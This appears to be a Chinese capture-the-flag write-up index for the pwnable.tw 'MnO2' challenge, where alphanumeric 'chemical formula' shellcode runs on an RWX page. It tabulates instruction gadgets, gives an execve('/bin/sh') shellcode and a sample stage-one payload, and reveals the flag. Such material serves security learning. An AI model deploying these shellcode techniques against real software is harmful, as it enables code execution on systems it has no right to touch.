---
tags:
  - alpha-shellcode
  - seccomp-bypass
platform: pwnable.tw
points: 300
arch: i386
libc: static
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "在固定的 RWX 内存区执行字母数字 shellcode，并在 seccomp 限制下用自修改代码拼出 syscall 指令。"
proof-of-concept: no
---

# MnO2 — pwnable.tw（300 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10301`
>
> Flag: `FLAG{4(7|-||>4|_||\||>|>|_|4|\/|(|\/|b|<(|=35|=|\/||\/|d|\|0|_.-}`

## 题目概览

一个 32 位 Linux 二进制，用 `scanf("%s")` 把用户输入读进位于 `0x324F6E4D` 的固定 RWX `mmap` 区（小端 ASCII 拼起来正是 "MnO2"）。随后校验函数 `check()` 检查输入是否为**合法的化学式**——每个字节都必须是字母或数字，且整个字符串要能切分成真实元素周期表中的元素符号（大写字母，可选一个小写，可选数字）。检查通过后，程序执行 `call eax`，而 `eax` 指向该缓冲区——即把输入当作 **shellcode** 执行。

核心挑战：写出**同时又是合法化学式的字母数字 shellcode**。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled (but mmap region is RWX)
  PIE:      No PIE
```

### `call eax` 时的寄存器状态

```text
EAX = 0x324F6E4D  (buffer address, also shellcode entry point)
EBX = 0x00000000
ECX = 0x00000000  (or ptr to element table, varies by libc)
EDX = 0x080489cc  (or similar code pointer)
ESI = libc GOT    (e.g. 0xf7faf000)
EDI = libc GOT    (same as ESI)
```

## 漏洞

### V1 — RWX 页上的直接 shellcode 执行（受限）

**根因：** `main()` 映射一块固定地址的 RWX 区域，把用户输入读进去，校验化学式，然后跳进去执行。该 mmap 缓冲区没有 W^X 保护——只要通过化学式校验，输入就会作为原生 x86 代码运行。

**约束：** 每个字节都必须既是字母数字（`[0-9A-Za-z]`），又能解析成元素周期表中元素符号（H、He、Li、Be、B、C、N、O、F、Ne、Na、……、Lv）的合法序列，并可带尾部数字。

这意味着可用指令集被严格限制在字母数字字节所编码的 x86 指令范围内：

## 可用指令集

### 单字节元素（直接对应 x86 操作码）

| 元素 | 十六进制 | x86 指令 |
|---------|-----|-----------------|
| `H` | `0x48` | `dec eax` |
| `B` | `0x42` | `inc edx` |
| `C` | `0x43` | `inc ebx` |
| `N` | `0x4E` | `dec esi` |
| `O` | `0x4F` | `dec edi` |
| `F` | `0x46` | `inc esi` |
| `P` | `0x50` | `push eax` |
| `S` | `0x53` | `push ebx` |
| `K` | `0x4B` | `dec ebx` |
| `V` | `0x56` | `push esi` |
| `W` | `0x57` | `push edi` |
| `U` | `0x55` | `push ebp` |
| `Y` | `0x59` | `pop ecx` |
| `I` | `0x49` | `dec ecx` |

### 双字节元素（多字节 gadget）

| 元素 | 字节 | 效果 |
|---------|-------|--------|
| `Xe` | `0x58 0x65` | `pop eax; gs`（前缀） |
| `Na` | `0x4E 0x61` | `dec esi; popad` |
| `Ba` | `0x42 0x61` | `inc edx; popad` |
| `Ca` | `0x43 0x61` | `inc ebx; popad` |
| `Bh` | `0x42 0x68` | `inc edx; push imm32` |
| `Th` | `0x54 0x68` | `push esp; push imm32` |
| `Rh` | `0x52 0x68` | `push edx; push imm32` |
| `Re` | `0x52 0x65` | `push edx; gs`（前缀） |
| `Zr` | `0x5A 0x72` | `pop edx; jb`（短跳转，通常直接fall through） |
| `Ar` | `0x41 0x72` | `inc ecx; jb`（短跳转） |
| `Ag` | `0x41 0x67` | `inc ecx; addr16`（前缀） |

### 数字对 gadget（数字后缀也能拼成指令）

| 数字 | 字节 | x86 指令 |
|--------|-------|-----------------|
| `10` | `0x31 0x30` | `xor [eax], esi` |
| `11` | `0x31 0x31` | `xor [ecx], esi` |
| `12` | `0x31 0x32` | `xor [edx], esi` |
| `01` | `0x30 0x31` | `xor [ecx], dh` |
| `30` | `0x33 0x30` | `xor esi, [eax]` |
| `32` | `0x33 0x32` | `xor esi, [edx]` |
| `41`–`49` | `0x34 0x3N` | `xor al, imm8` |
| `50000` | `0x35 ...` | `xor eax, imm32` |

## 利用路径

所有解法都必须产出能通过化学式校验的 shellcode。由于 `int 0x80`（`\xcd\x80`）和 `/bin/sh` 都不是字母数字，每条路径都要用到**自修改代码**或**两段式策略**。解法可归为几类：

---

### 路径 A — 两段式：字母数字 `read()` stub → 不受限制的第二段（最常见）

**相关题解：** 59、378、799、1074、1155、1236、1303、1395、2972、3480、3578、7641、8410、15989、21490、31599、exp.py

**思路：** 第一段（即化学式）是一个自修改解码器，它：
1. 用 XOR 操作在已知偏移处把 `int 0x80`（`\xcd\x80`）补丁进自身
2. 为 `read(0, buf, big_count)` 准备寄存器——`eax=3, ebx=0, ecx=buf, edx=large`
3. 穿过一段 NOP 滑板（如 `N` = `dec esi`、`O` = `dec edi`、`B` = `inc edx`）落到补丁好的 `int 0x80`
4. 读入第二段（不受限制的二进制），覆盖缓冲区，执行标准 `execve("/bin/sh")` shellcode

**给 `int 0x80` 打补丁的关键技巧：**

- **用 ESI/EDI 做 XOR：** 先经 `popad` 或自 XOR 把 ESI/EDI 置零，再构造目标值。用 `xor [ecx], esi`（数字 `11`）或 `xor [eax], esi`（数字 `10`）写入任意字节。
- **用 DH 做 XOR：** 先用 `push`/`pop` 序列装入 DH，再用 `xor [ecx], dh`（数字 `01`）做字节级写入。
- **用 AL 做 XOR：** 用 `xor al, imm8`（数字 `4N`）配合 `xor [ecx+offset], al` 修补内存。
- **占位字节：** 在已知偏移放 `2O`（= `0x32 0x4F`），再用正确的值异或出 `0xCD 0x80`。

**设置 EAX=3（SYS_read）：**
- `5MnO2` = `xor eax, 0x324F6E4D` → 把 EAX 清零（因为 EAX 本来就装着 `0x324F6E4D`）
- 再 `xor al, 0x31; xor al, 0x32` → `al = 3`
- 或者：`inc ebx`×3 后 `push ebx; pop eax`，再 `Xe; dec ebx`×3

**设置 EBX=0（fd=stdin）：**
- `popad`（`Na`、`Ba`、`Ca`）从栈弹出 8 个寄存器；预先压入零即可得到 `ebx=0`
- 或者入口时 EBX 本来就是 0

**设置 ECX（缓冲区地址）：**
- `push eax; pop ecx`（`PY`），因为 EAX 就是缓冲区地址

**第二段：** 标准 NOP 滑板 + `execve("/bin/sh")`：
```nasm
xor eax, eax
push eax
push 0x68732f2f  ; "//sh"
push 0x6e69622f  ; "/bin"
mov ebx, esp
push eax
push ebx
mov ecx, esp
cdq               ; edx = 0
mov al, 0xb
int 0x80
```

**示例最小化学式（解法 1155）：**
```text
PYKSXe4N410AcISXe420AcCCCCSXeKKKBBBBBBAu9
```

---

### 路径 B — 单段式：用 XOR 循环把整个 `execve` 就地写出来

**相关题解：** 786、2233、8153

**思路：** 不调用 `read()`，而是用 XOR gadget 把**整个** `execve("/bin/sh")` shellcode 逐字节写进内存。这样就不需要第二次 `send()`。

**技巧：** 对每个 shellcode 字节：
1. 用 `inc esi`（`F`）递增到目标字节值
2. `xor [ecx], esi`（`11`）写入
3. `dec esi`（`N`）复位，`inc ecx`（`Ar`）前进

解法 786 就是逐字节 `inc esi × ord(c); xor; dec esi × ord(c); xor; inc ecx`。这样 payload 会非常长，但只需一段。

解法 8153 思路类似，用三 XOR 模式在 ESI/EDI 寄存器里构造 `/bin/sh`，用内存 XOR 构造 `int 0x80`，再用 `popad` 装入全部寄存器并执行 syscall。

**缺点：** payload 可能长达数千字节（上限约 31337）。

---

### 路径 C — 构造 ROP 链并用自修改补出 `ret`

**相关题解：** 408、823

**思路：** 不直接执行 shellcode，而是在化学式末尾用 XOR 构造一条 `ret` 指令（`0xC3`），同时在栈上压入 ROP 链（或一次 `scanf` 调用）。执行到补丁好的 `ret` 时，就返回到 ROP 链里。

**解法 408 的具体做法：**
1. 用 `popad` 把受控值装入寄存器
2. 用 `dec eax` + `xor eax, imm32` 序列算出 `scanf` 的 PLT 地址
3. 把 `scanf(format="%s", buf=rwx_addr)` 的调用帧压栈
4. 通过向 payload 末尾 XOR 写，补出 `ret`（`0xC3 = 0x46 ^ 0x85`）
5. `ret` → `scanf` 读入不受限制的第二段 → `execve`

**解法 823 的具体做法：**
1. 以入口时 EDI 中的 GOT 地址为基址
2. 循环 `dec ebx` + `xor [edx], bl`，从 GOT 指针里减，直到它指向 libc 里的 one-gadget
3. 用 ESI 做 XOR 补出 `ret`，把算好的 one-gadget 地址压栈，`ret` 进去

---

### 路径 D — 直接伪造 `int 0x80` 并在寄存器里构造 `/bin/sh`

**相关题解：** 8153（耗时两天的解法）、2233

**思路：** 完全不调 `read()` 或 `scanf()`，仅用合法化学式指令构造完整的 `execve("/bin/sh", argv, NULL)` 系统调用：
1. 用 XOR 链在内存里拼出 `/bin/sh\0`（用 ESI/EDI 暂存部分值，异或栈上压入的常量，再用 `xor [addr], reg` 写回）
2. 令 EBX → `/bin/sh` 指针，ECX=0，EDX=0，EAX=0xb
3. 用同样的 XOR 技巧在已知地址构造 `int 0x80`
4. Fall through 或跳过去

这条路径最难、最枯燥，但只需一段 payload。

## 利用原语总结

| 原语 | 技巧 | 备注 |
|-----------|-----------|-------|
| 清零 EAX | `5MnO2`（xor eax, 0x324f6e4d） | EAX 本来就装着该值 |
| 清零 ESI/EDI | 配合压入的零使用 `popad` | 或与内存异或：`30` = `xor esi, [eax]` |
| 清零 EBX | 入口时已是 0，或用 `popad` | |
| 设 EAX=3 | XOR 序列：`41` `42` 等 | `xor al, 0x31; xor al, 0x32` = 3 |
| 设 ECX=buf | `PY`（push eax; pop ecx） | 入口时 EAX = buf |
| 写任意字节 | XOR：`inc esi*N; xor [ecx],esi; dec esi*N` | 慢但通用 |
| 压入 imm32 | `Bh`、`Th`、`Rh` + 4 个字母数字 | 元素前缀 + 4 字节 |
| 补出 `int 0x80` | XOR `0x324F` 或 `0x3131` → `0xCD80` | 多种 XOR 密钥组合 |
| NOP 滑板 | `N`（dec esi）、`O`（dec edi）、`B`（inc edx）、`F`（inc esi） | 无害的单字节元素 |
| `popad` | `Na`、`Ba`、`Ca` | 从栈装入 8 个寄存器 |

## 关键偏移

```python
BUF         = 0x324F6E4D   # Fixed mmap'd RWX buffer (= "MnO2" in LE)
mmap_base   = 0x324F6000   # mmap hint address
scanf_plt   = 0x08048420   # (binary-specific)
element_tbl = 0x08048890   # Periodic table strings in .rodata
```

## 题解文章

| 文件 | 主要路径 | 关键技术 | 备注 |
|------|-------------|---------------|-------|
| `59.md` | A | 经 `[ecx+0x73]` 做 XOR 补丁 `int 0x80`；`push/pop` 设 eax=3 | 每个“化合物”都有汇编注释 |
| `378.md` | A | 紧凑化学式；XOR 构造 `int 0x80` | payload 短 |
| `408.md` | C | 为 `scanf()` 构造 ROP；用 XOR 补 `ret` | 优雅的栈迁移思路 |
| `751.md` | B | Perl 单行；`dec eax` + `xor [eax],esi` 逐字节写 | 纯 bash，不用 Python |
| `755.md` | D | 大规模 XOR 链就地构造 `/bin/sh` 和 `int 0x80` | 2048+ 字节单段 |
| `786.md` | B | 对 execve 每个字节 `inc esi*N; xor; dec esi*N` | 逐字节暴力 |
| `799.md` | A | `popad` 清零 + `xor` 补丁；干净极简 | |
| `823.md` | C | 基于 GOT 的 one_gadget；喷射 `dec ebx` + XOR 循环 | 依赖 libc |
| `1074.md` | A | 自修改；补出 `int 0x80` 和 `/bin/sh` | 紧凑 |
| `1155.md` | A | 极简：`XOR [eax+0x65]` 补丁；43 字节内调 `read` | 已知最短化学式 |
| `1236.md` | A | `popad` + 经 `Rh` 压栈做 XOR | 干净的寄存器准备 |
| `1303.md` | A | `Rh` 压栈 + `xor [eax],dh` 补丁 | |
| `1395.md` | A | `5MnO2` 清零 EAX；`popad` 准备寄存器 | 极简且干净 |
| `2121.md` | A | 用 ecx 对 `[eax+0x65]` 做 XOR；push/pop 设 eax=3 | |
| `2233.md` | A | `xor dword ptr [eax+0x50],edx` + XOR 链 | 使用 `[eax+imm]` 寻址 |
| `2972.md` | A | 经 `At0` 做 `inc ecx`；`xor [esi+0x34], ecx` 逐字节写 | 长但有条理 |
| `3480.md` | A | 紧凑：`5MnO2` 清零 + `Ag` inc_ecx | |
| `3578.md` | A | `xor [ecx+ebp*2+offset]` 带索引写入 | 用 EBP 作索引 |
| `6247.md` | A | 经 `Zr` 做 `pop edx`；经 `Bh` 压值 | |
| `7641.md` | A | `xor [eax+0x65], al` + `Hf` 前缀写入 | |
| `8153.md` | D | 完整单段：在 ESI/EDI 里构造 `/bin/sh`，伪造 `int 0x80` | 耗时两天；370+ 行 |
| `8410.md` | A | 配合 `Th` 压栈做 `xor [eax+0x65],ecx` | |
| `15989.md` | A | `Si2` 异或 gadget；用 `O` 作 NOP 填充 | |
| `21490.md` | A | `xor esi,[eax]` 后接 `xor [ecx],esi` 链 | 完整汇编 gadget 表 |
| `31599.md` | A | `1He` 异或 + `Ag` inc_ecx + `ThK111` 压栈 | 紧凑，XOR 技巧 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用的两段式利用（化学式 → `read()` → `execve`） |
| `desc.txt` | 题目描述 |
| `artifacts/mno2` | 原始题目二进制（i386，已 strip） |
| `solution/*.md` | 社区题解文章（72 个解法） |
